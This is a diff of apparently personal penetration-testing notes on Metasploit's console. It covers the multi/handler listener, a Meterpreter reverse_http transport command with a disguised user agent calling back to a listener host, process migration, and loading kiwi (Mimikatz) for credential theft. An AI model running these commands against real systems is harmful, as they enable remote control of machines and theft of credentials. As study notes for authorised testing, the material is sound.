@@ -1,5 +1,5 @@
 # Metasploit 
-This as simple document condensing the usage of the `msfconsole`. For specific [[Meterpreter-Commands]] related follow the link for [[Proxying-with-Metasploit]] follow this one. For a brief `msvenom` usage see [[Shells]] or for building a Metasploit module see [[Build-MSF-Modules]] 
+This as simple document condensing the usage of the `msfconsole`. For specific [[Meterpreter-Commands]] related follow the link for [[Pivoting-and-Proxying-with-Metasploit]] follow this one. For a brief `msvenom` usage see [[Shells]] or for building a Metasploit module see [[Build-MSF-Modules]] 
 
 ## Introduction
 
@@ -125,10 +125,30 @@ Meterpreter is payload type that can dynamically extended at run-time providing 
 
 ## Exploit Multi Handler
 For advanced Metasploit payloads use the builtin listener with
-`use multi/handler` just `set payload insert/payload/name` and `show options` to see configuration and `set <some option name>` to configure. `exploit` or `run` to execute the multi/handler and `-j` to background on execution.
+`use multi/handler` just `set payload insert/payload/name` and `show options` and `show advanced` to see configuration and `set <some option name>` to configure. `exploit` or `run` to execute the multi/handler and `-j` to background on execution.
 
 ## Client Side Attacks
 [Offensive Sercurity](https://www.offensive-security.com/metasploit-unleashed/client-side-attacks/): *"As network administrators and software developers fortify the perimeter, pentesters need to find a way to make the victims open the door for them to get into the network. Client side attacks require user-interaction such as enticing them to click a link, open a document, or somehow get to your malicious website."*
+
+## Meterpreter Transports
+
+Transports are the answer to making meterpreter connect over various protocols, see [Transports Documentation](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html). 
+```bash
+transport list # to list 
+transport add -t reverse_http -l 10.10.10.10 -p 5105 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1"
+# -l lhost; -p lport, -T retry total, -W retry wait, -C communication timeout, -A custom user agent 
+
+```
+
+## Metasploit Post Exploitation
+
+Metasploit has post-exploitation features and MSF modules that take an active sessions as an argument. These features are best examplified with the various [[Meterpreter-Commands]], although a important feature is `migrate $PSID`-ing to different more stable and more privileged processes in memory. With the `load` command in a Meterpreter one load various modules such as `powershell` and then `powershell_execute`, see [[useful_powershell]] for help with basic powershell. Similar `load kiwi` will load [[Mimikatz]]. For [[Pivoting-and-Proxying-with-Metasploit]], it different for different version of Metasploit.
+
+## Further Automation
+We can pass a .rc file that automates the entire process in similar way as recent versions of [[Recon-ng]].
+```bash
+sudo msfconsole -r setup.rc
+```
 
 ## References
 
